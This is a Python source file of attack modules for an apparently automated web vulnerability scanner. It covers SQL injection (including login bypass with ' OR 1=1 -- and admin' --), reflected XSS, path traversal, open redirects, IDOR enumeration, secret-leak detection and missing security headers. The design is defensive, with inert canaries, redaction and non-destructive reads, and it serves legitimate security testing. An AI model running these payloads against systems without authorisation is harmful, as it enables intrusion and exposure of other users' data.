"""Attack modules. Each module has two stages:

  discover(endpoint, param) -> Candidate | None    (cheap, may be wrong)
  exploit(candidate)       -> Finding   | None     (safe canary PROOF; no proof = no report)

All payloads are non-destructive: they only read data or reflect an inert canary.
"""
from __future__ import annotations

import re
import secrets

from ..knowledge import KB
from ..models import Candidate, Endpoint, Finding

SQL_ERRORS = re.compile(r"(sql|sqlite|syntax error|unrecognized token|unterminated|ORA-\d+|mysql)", re.I)
CANARY_FILE_RE = re.compile(r"CART-CANARY-[0-9a-f]{16}")
SECRET_RE = re.compile(r"(SECRET_KEY|api[_-]?key|password|token)\"?\s*[:=]\s*\"?([^\"\s,}]{6,})", re.I)


def _canary(prefix="cart-canary"):
    return f"{prefix}-{secrets.token_hex(4)}"


def _make_finding(ctx, vtype, ep: Endpoint, param, payload, evidence, proof_request, **override):
    kb = KB[vtype]
    ctx.counter += 1
    data = dict(
        id=f"F{ctx.counter:02d}", vuln_type=vtype, title=kb["title"], severity=kb["severity"],
        cvss=kb["cvss"], cwe=kb["cwe"], owasp=kb["owasp"], path=ep.path, method=ep.method,
        param=param, payload=payload, evidence=evidence, proof_request=proof_request, impact=kb["impact"],
    )
    data.update(override)
    return Finding(**data)


def _redact(value: str, keep=6):
    return value[:keep] + "*" * max(0, min(len(value) - keep, 12))


class Module:
    vuln_type = ""
    name = ""

    def __init__(self, ctx):
        self.ctx = ctx
        self.client = ctx.client

    def targets(self, ep: Endpoint) -> list[str | None]:
        return []

    def _send(self, ep, param, value, session=None):
        params = {p: "test" for p in ep.params}
        params[param] = value
        if ep.method == "POST":
            return self.client.post(ep.path, data=params, agent=self.name, session=session)
        return self.client.get(ep.path, params=params, agent=self.name, session=session)


# ----------------------------------------------------------------------------- SQLi
class SQLInjection(Module):
    vuln_type, name = "sqli", "sqli"

    def targets(self, ep):
        return list(ep.params)

    def is_login(self, ep):
        return ep.method == "POST" and any("pass" in p.lower() for p in ep.params)

    def discover(self, ep, param):
        r = self._send(ep, param, "'")
        if r.status_code >= 500 or SQL_ERRORS.search(r.text):
            return Candidate("sqli", ep, param, f"quote caused HTTP {r.status_code} / SQL error text")
        if param.lower() in ("id", "uid", "pid") or param.lower().endswith("_id"):
            return Candidate("sqli", ep, param, "numeric id parameter (common SQLi spot)")
        return None

    def exploit(self, c: Candidate):
        if self.is_login(c.endpoint):
            return self._auth_bypass(c)
        ep, p = c.endpoint, c.param
        pairs = [("' OR 1=1 --", "' AND 1=2 --"), ("1 OR 1=1", "1 AND 1=2"), ("x' OR 'a'='a", "x' AND 'a'='b")]
        for true_p, false_p in pairs:
            t1, f1, t2 = self._send(ep, p, true_p), self._send(ep, p, false_p), self._send(ep, p, true_p)
            stable = t1.status_code == t2.status_code == 200 and abs(len(t1.text) - len(t2.text)) < 5
            if stable and f1.status_code == 200 and len(t1.text) - len(f1.text) > 20:
                ev = (f"Boolean proof: TRUE condition returned {len(t1.text)} bytes (twice, stable), "
                      f"FALSE condition returned {len(f1.text)} bytes. The database executed our logic.")
                extra = re.findall(r"<li>([^<]+)</li>", t1.text)
                if extra:
                    ev += f" Rows exposed by TRUE payload: {extra[:6]}"
                return _make_finding(self.ctx, "sqli", ep, p, true_p, ev,
                                     f"GET {ep.path}?{p}={true_p}")
        return None

    def _auth_bypass(self, c):
        ep = c.endpoint
        user_f = next((x for x in ep.params if "user" in x.lower() or "name" in x.lower()), ep.params[0])
        pass_f = next(x for x in ep.params if "pass" in x.lower())
        s0 = self.client.new_session()
        bad = self.client.post(ep.path, data={user_f: _canary(), pass_f: _canary()}, agent=self.name, session=s0)
        for payload in ("' OR 1=1 --", "admin' --"):
            s = self.client.new_session()
            r = self.client.post(ep.path, data={user_f: payload, pass_f: "x"}, agent=self.name, session=s)
            if r.status_code in (200, 302) and r.status_code != bad.status_code and s.cookies:
                home = self.client.get("/", agent=self.name, session=s)
                m = re.search(r"Logged in as ([\w.-]+)", home.text)
                who = m.group(1) if m else "unknown user"
                self.ctx.sessions["sqli_bypass"] = s
                self.ctx.sessions["sqli_bypass_user"] = who
                ev = (f"Invalid login returned HTTP {bad.status_code}; payload returned HTTP {r.status_code} "
                      f"and a session cookie. Home page then says 'Logged in as {who}' without any password.")
                return _make_finding(self.ctx, "sqli_auth_bypass", ep, user_f, payload, ev,
                                     f"POST {ep.path}  {user_f}={payload}&{pass_f}=x")
        return None


# ----------------------------------------------------------------------------- XSS
class ReflectedXSS(Module):
    vuln_type, name = "xss_reflected", "xss"

    def targets(self, ep):
        return list(ep.params) if ep.method == "GET" else []

    def discover(self, ep, param):
        probe = "cartprobe" + secrets.token_hex(3)
        r = self._send(ep, param, probe)
        if probe in r.text:
            return Candidate("xss_reflected", ep, param, "input is reflected in the page")
        return None

    def exploit(self, c):
        tag = _canary(self.ctx.policy.canary_prefix)
        payload = f"<{tag}>"  # inert custom HTML tag: proves injection, executes nothing
        r = self._send(c.endpoint, c.param, payload)
        if payload in r.text and "html" in r.headers.get("Content-Type", ""):
            return _make_finding(self.ctx, "xss_reflected", c.endpoint, c.param, payload,
                                 f"Canary tag {payload} came back UNESCAPED inside the HTML response, so the "
                                 f"browser would parse attacker-controlled markup.",
                                 f"GET {c.endpoint.path}?{c.param}={payload}")
        return None


# ----------------------------------------------------------------------------- Path traversal
class PathTraversal(Module):
    vuln_type, name = "path_traversal", "traversal"
    NAMES = ("file", "path", "page", "doc", "template", "name", "dir", "f", "filename", "download")
    PAYLOADS = ("../private/canary.txt", "../../private/canary.txt", "....//private/canary.txt",
                "..//private/canary.txt")

    def targets(self, ep):
        return [p for p in ep.params if p.lower() in self.NAMES] if ep.method == "GET" else []

    def discover(self, ep, param):
        return Candidate("path_traversal", ep, param, f"parameter '{param}' looks like a file name")

    def exploit(self, c):
        for payload in self.PAYLOADS:
            r = self._send(c.endpoint, c.param, payload)
            m = CANARY_FILE_RE.search(r.text)
            if r.status_code == 200 and m:
                return _make_finding(self.ctx, "path_traversal", c.endpoint, c.param, payload,
                                     f"Read the planted canary file outside the download folder: '{m.group(0)}'.",
                                     f"GET {c.endpoint.path}?{c.param}={payload}")
        return None


# ----------------------------------------------------------------------------- Open redirect
class OpenRedirect(Module):
    vuln_type, name = "open_redirect", "redirect"
    NAMES = ("next", "url", "redirect", "return", "returnto", "goto", "dest", "target", "continue")
    CANARY_URL = "https://cart-canary.invalid/proof"  # .invalid never resolves (RFC 2606)

    def targets(self, ep):
        return [p for p in ep.params if p.lower() in self.NAMES] if ep.method == "GET" else []

    def discover(self, ep, param):
        return Candidate("open_redirect", ep, param, f"parameter '{param}' controls a redirect")

    def exploit(self, c):
        for payload in (self.CANARY_URL, "//cart-canary.invalid/proof"):
            r = self._send(c.endpoint, c.param, payload)
            loc = r.headers.get("Location", "")
            if 300 <= r.status_code < 400 and "cart-canary.invalid" in loc:
                return _make_finding(self.ctx, "open_redirect", c.endpoint, c.param, payload,
                                     f"Server answered HTTP {r.status_code} with Location: {loc} "
                                     f"(redirect NOT followed - policy).",
                                     f"GET {c.endpoint.path}?{c.param}={payload}")
        return None


# ----------------------------------------------------------------------------- IDOR
class IDOR(Module):
    vuln_type, name = "idor", "idor"
    NUM = re.compile(r"/(\d+)(/|$)")

    def targets(self, ep):
        return [None] if ep.requires_auth and self.NUM.search(ep.path) else []

    def discover(self, ep, param):
        return Candidate("idor", ep, None, "numeric object id in an authenticated URL")

    def exploit(self, c):
        auth = self.ctx.policy.auth
        s, _ = self.client.login(auth["username"], auth["password"], auth.get("login_path", "/login"), agent=self.name)
        own_id = int(self.NUM.search(c.endpoint.path).group(1))
        own = self.client.get(c.endpoint.path, agent=self.name, session=s)
        if own.status_code != 200:
            return None
        leaked = []
        for other in [i for i in range(1, 6) if i != own_id]:
            path = self.NUM.sub(f"/{other}\\2", c.endpoint.path, count=1)
            r = self.client.get(path, agent=self.name, session=s)
            if r.status_code == 200 and r.text != own.text:
                try:
                    data = r.json()
                    leaked.append(f"id={other}: username={data.get('username')}, "
                                  f"email={_redact(str(data.get('email', '')), 3)}")
                except Exception:
                    leaked.append(f"id={other}: {len(r.text)} bytes")
        if leaked:
            pattern = self.NUM.sub("/<id>\\2", c.endpoint.path, count=1)
            ep = Endpoint(pattern, "GET", [], c.endpoint.source, True)
            return _make_finding(self.ctx, "idor", ep, "id (path)", "other users' ids",
                                 f"Logged in as low-privilege '{auth['username']}' (id={own_id}) and read "
                                 f"{len(leaked)} other accounts: " + "; ".join(leaked),
                                 f"GET {pattern.replace('<id>', '1')} (as {auth['username']})")
        return None


# ----------------------------------------------------------------------------- Info disclosure
class InfoDisclosure(Module):
    vuln_type, name = "info_disclosure", "infoleak"
    HINTS = ("debug", "config", "env", "status", "info", "phpinfo", ".git", "backup")

    def targets(self, ep):
        return [None] if ep.method == "GET" and any(h in ep.path.lower() for h in self.HINTS) else []

    def discover(self, ep, param):
        return Candidate("info_disclosure", ep, None, f"suspicious path name '{ep.path}'")

    def exploit(self, c):
        r = self.client.get(c.endpoint.path, agent=self.name)
        m = SECRET_RE.search(r.text)
        if r.status_code == 200 and m:
            return _make_finding(self.ctx, "info_disclosure", c.endpoint, None, None,
                                 f"Response leaks {m.group(1)} = {_redact(m.group(2))} (redacted in report).",
                                 f"GET {c.endpoint.path}")
        return None


# ----------------------------------------------------------------------------- Headers
class SecurityHeaders(Module):
    vuln_type, name = "missing_security_headers", "headers"
    REQUIRED = ("Content-Security-Policy", "X-Frame-Options", "X-Content-Type-Options")

    def targets(self, ep):
        return [None] if ep.path == "/" and ep.method == "GET" else []

    def discover(self, ep, param):
        return Candidate("missing_security_headers", ep, None, "passive header check")

    def exploit(self, c):
        r = self.client.get("/", agent=self.name)
        missing = [h for h in self.REQUIRED if h not in r.headers]
        if missing:
            return _make_finding(self.ctx, "missing_security_headers", c.endpoint, None, None,
                                 f"Response of GET / is missing: {', '.join(missing)}.", "GET /")
        return None


ALL_MODULES = [SQLInjection, ReflectedXSS, PathTraversal, OpenRedirect, IDOR, InfoDisclosure, SecurityHeaders]
